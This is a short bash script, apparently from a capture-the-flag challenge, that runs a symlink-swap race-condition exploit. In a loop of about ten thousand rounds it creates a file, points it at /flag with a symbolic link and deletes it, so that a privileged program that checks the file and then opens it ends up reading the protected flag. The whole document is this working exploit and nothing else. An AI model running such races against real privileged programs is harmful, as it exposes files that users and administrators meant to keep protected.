#!/bin/bash

for i in {0..10000}
do
    touch my_file
    ln -sf /flag my_file
    rm my_file
done
